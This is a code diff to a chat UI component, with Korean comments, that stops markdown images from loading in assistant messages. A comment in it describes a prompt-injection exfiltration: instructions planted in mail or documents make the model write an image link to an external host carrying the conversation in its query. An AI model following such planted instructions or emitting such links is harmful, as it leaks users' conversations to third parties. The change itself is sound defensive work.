@@ -7,12 +7,14 @@ import { Button } from "@/components/ui/button";
 import ToolChip from "./ToolChip";
 import type { ViewMessage } from "@/lib/chat/view";
 
-// 표는 좁은 말풍선에서 가로로 넘치므로 스크롤 상자에 담는다. 링크는 새 탭.
+// 표는 좁은 말풍선에서 가로로 넘치므로 스크롤 상자에 담는다. 링크는 새 탭. 이미지는 대체 글만.
 const MD: Components = {
   table: ({ children }) => <div className="not-prose my-2 overflow-x-auto rounded-md border"><table className="w-full border-collapse text-xs">{children}</table></div>,
   th: ({ children }) => <th className="whitespace-nowrap border-b bg-muted px-2.5 py-1.5 text-left font-semibold">{children}</th>,
   td: ({ children }) => <td className="border-b px-2.5 py-1.5 align-top">{children}</td>,
   a: ({ href, children }) => <a href={href} target="_blank" rel="noreferrer" className="text-primary underline">{children}</a>,
+  // 이미지는 불러오지 않는다 — 메일·문서에 심은 지시로 모델이 ![](https://외부?q=대화내용)을 쓰면 그리기만 해도 외부로 샌다
+  img: ({ alt }) => <span className="text-muted-foreground">[이미지{alt ? `: ${alt}` : ""}]</span>,
 };
 
 /** 말풍선 하나 — 사용자는 오른쪽 평문, 이노봇은 왼쪽 마크다운 + 도구 칩. */
